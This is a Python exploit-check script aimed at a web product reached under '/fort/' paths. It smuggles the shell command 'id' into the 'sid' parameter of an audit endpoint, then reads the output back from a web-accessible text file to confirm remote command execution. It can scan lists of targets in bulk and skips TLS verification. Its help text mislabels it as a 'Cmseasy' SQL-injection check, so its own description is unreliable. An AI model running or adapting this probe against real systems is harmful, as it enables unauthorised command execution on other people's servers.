import requests
import argparse
from requests import RequestException

requests.packages.urllib3.disable_warnings()


def check(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    if not target.startswith("http"):
        target = f"http://{target}"

    url = "/fort/subforeign;help/audit/get_clip_img"
    data = "ip=local&frame=1&dirno=1&sid=nonexistent;id"

    try:
        resp = requests.post(
            target + url,
            data=data,
            headers=headers,
            verify=False,
            timeout=30
        )
        if resp.status_code == 200:
            result_resp = requests.get(
                target + "/fort/trust/version/T1.txt", verify=False, timeout=30
            )
            if (
                result_resp.status_code == 200
                and "uid=" in result_resp.text
                and "gid=" in result_resp.text
            ):
                print(f"{target} 存在漏洞")
    except RequestException as e:
        print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, "r") as f:
                filecontent = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for u in filecontent:
            check(u.strip())
    else:
        check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check Cmseasy crossall_act.php sqli")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test Url File")

    args = parser.parse_args()
    main(args)
